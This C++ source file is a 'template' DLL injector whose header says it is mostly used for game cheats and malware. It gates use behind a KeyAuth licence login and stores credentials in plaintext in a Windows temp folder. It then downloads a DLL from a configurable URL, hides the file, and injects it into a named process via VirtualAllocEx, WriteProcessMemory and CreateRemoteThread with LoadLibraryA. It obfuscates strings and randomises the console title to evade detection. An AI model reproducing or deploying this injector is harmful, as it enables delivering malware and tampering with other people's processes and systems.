
/*

this is a simple dll injector that uses the keyauth api to login and inject a dll into a process
most used for game cheats, malware and other stuff,
this code is a template, you can change the code to your needs

coded by juve/tosted (https://github.com/zjuvee)

use at your own risk, im not responsible for any damage caused in your system or personal data

credits: 

auth system: https://github.com/KeyAuth/KeyAuth-CPP-Example / https://keyauth.cc/

dll injection system: https://guidedhacking.com/ 

*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "auth/auth.hpp"
#include <string>
#include "auth\skStr.h"
#include <filesystem>
#include <chrono>
#include <thread>
#include <locale>
#include <codecvt>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <string>
#include "auth/utils.hpp"
#include "xorstr.hpp"

using namespace std;

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "winmm.lib")

//===================       KeyAuth things       =========================//

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
const std::string compilation_date = (std::string)skCrypt(__DATE__);
const std::string compilation_time = (std::string)skCrypt(__TIME__);

using namespace KeyAuth;

std::string name = skCrypt("program name").decrypt();
std::string ownerid = skCrypt("ownerid").decrypt();
std::string secret = skCrypt("secret key").decrypt();
std::string version = skCrypt("1.0").decrypt();
std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
std::string path = skCrypt("").decrypt();

api KeyAuthApp(name, ownerid, secret, version, url, path);

//=================== convert string to wstring =========================//

std::wstring StringToWString(const std::string& str) {
    int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(length, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], length);
    return wstr;
}

//===================        DownloadFile       =========================//

HRESULT DownloadFile(const std::wstring& url, const std::wstring& filePath) {
    HRESULT hr = URLDownloadToFileW(
        NULL,                       
        url.c_str(),                
        filePath.c_str(),           
        0,                          
        NULL                        
    );

    if (SUCCEEDED(hr)) {
        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    return hr;
}

//===================      get user path        =========================//

std::string getUserName() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserName(username, &username_len)) {
        return std::string(username);
    }
    return "";
}



//===================   generate random name   ========================//

std::string generateRandomName() {
    std::string name;
    srand(time(0));

    for (int i = 0; i < 10; ++i) {
        if (i % 2 == 0) {
            char c = 'a' + rand() % 26;
            name += c;
        }
        else {
            char c = 'A' + rand() % 26;
            name += c;
        }
    }
    return name;
}


//===================      cmd text color      =========================//
void setcolor(unsigned short color)
{
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}



//===================          HEADER          =========================//
void header()
{
    std::cout << (xorstr_("                    __  ___________    ____  __________ ")) << std::endl;
    std::cout << (xorstr_("                   / / / / ____/   |  / __ \\/ ____/ __ \\")) << std::endl;
    std::cout << (xorstr_("                  / /_/ / __/ / /| | / / / / __/ / /_/ /")) << std::endl;
    std::cout << (xorstr_("                 / __  / /___/ ___ |/ /_/ / /___/ _, _/ ")) << std::endl;
    std::cout << (xorstr_("                /_/ /_/_____/_/  |_/_____/_____/_/ |_|  ")) << std::endl;
    std::cout << (xorstr_("                                                   ")) << std::endl;
    std::cout << (xorstr_("                                               dsc.gg/example")) << std::endl;

}

//===================           AUTH           =========================//
int auth()
{
    bool asd = false;

    std::string consoleTitle = generateRandomName();
    name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();
    SetConsoleTitleA(consoleTitle.c_str());
    setcolor(4);
    KeyAuthApp.init();
    if (!KeyAuthApp.response.success)
    {
        exit(1);
    }

    if (std::filesystem::exists(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"))) // change to your .json autologin path
    {
        if (!CheckIfJsonKeyExists((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("username"))))
        {
            std::string key = ReadFromJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("license")));
            KeyAuthApp.license(key);
            if (!KeyAuthApp.response.success)
            {
                std::remove(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            header();
            std::cout << skCrypt("[+] automatically logged !\n");
            Sleep(2000);
        }
        else
        {
            std::string username = ReadFromJson((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("username")));
            std::string password = ReadFromJson((xorstr_("C:\\Windows\\Temp\\fnDNerucF.json")), (xorstr_("password")));
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.response.success)
            {
                std::remove(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"));

                Sleep(1500);
                exit(1);
            }
            header();
            std::cout << skCrypt("[+] automatically logged !\n");
            Sleep(2000);
        }
    }
    else
    {

        header();

        std::cout << skCrypt("\n\n [1] Login\n\n [2] Register\n\n Choose an option: ");

        int option;
        std::string username;
        std::string password;
        std::string key;

        std::cin >> option;
        switch (option)
        {
        case 1:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            KeyAuthApp.login(username, password);
            break;
        case 2:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            std::cout << skCrypt("\n Enter license: ");
            std::cin >> key;
            KeyAuthApp.regstr(username, password, key);
            break;
        default:

            Sleep(3000);
            exit(1);
        }

        if (!KeyAuthApp.response.success)
        {

            Sleep(1500);
            exit(1);
        }
        if (username.empty() || password.empty())
        {
            WriteToJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("license")), key, false, "", "");

        }
        else
        {
            WriteToJson(xorstr_("C:\\Windows\\Temp\\fnDNerucF.json"), (xorstr_("username")), username, true, (xorstr_("password")), password);

        }


    }

    for (int i = 0; i < KeyAuthApp.user_data.subscriptions.size(); i++) {
        auto sub = KeyAuthApp.user_data.subscriptions.at(i);
        std::cout << skCrypt("\n name: ") << sub.name;
        std::cout << skCrypt(" : expiry: ") << tm_to_readable_time(timet_to_tm(string_to_timet(sub.expiry)));
        Sleep(2000);
    }

    return 0;
}

std::string tm_to_readable_time(tm ctx) {
    char buffer[80];

    strftime(buffer, sizeof(buffer), (xorstr_("%a %m/%d/%y %H:%M:%S %Z")), &ctx);

    return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
    auto cv = strtol(timestamp.c_str(), NULL, 10); // long

    return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}

// obtener proc id
DWORD GetProcId(const char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

// 
int main() {

    //=================================
        // init url and filepath and set the folder path to the dll file

    std::string url = (xorstr_("https://example.com")); // URL del archivo a descargar
    std::string filePath = (xorstr_("C:/YOUR/PATH/DLL.dll"));

    // set the console size
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);
    MoveWindow(console, r.left, r.top, 610, 385, TRUE);
    const char* dllPath = (xorstr_("C:/YOUR/PATH/DLL.dll"));
    const char* procName = (xorstr_("process.exe"));
    DWORD procId = 0;

    // random name for the console
    std::string consoleTitle = generateRandomName();
    SetConsoleTitleA(consoleTitle.c_str());

    // auth moment
    auth();
    system((xorstr_("cls")));
    
    //=================================
        // download dll
    std::wstring wUrl = StringToWString(url);
    std::wstring wFilePath = StringToWString(filePath);
    
    HRESULT result = DownloadFile(wUrl, wFilePath);

    
    //=================================

    printf(xorstr_("[+] looking for the process...\n"));
    Sleep(2000);
    printf(xorstr_("[+] injecting...\n"));
    
    //=================================
        // inject dll 
    while (!procId)
    {
        procId = GetProcId(procName);
        Sleep(30);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (loc)
        {
            WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
        }

        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

        if (hThread)
        {
            CloseHandle(hThread);
        }

    }

    if (hProc)
    {
        CloseHandle(hProc);
    }
    
    Sleep(1000);
    printf(xorstr_("[+] successfully injected!, closing in 5 seconds..."));
    Sleep(5000);
    
    return 0;
}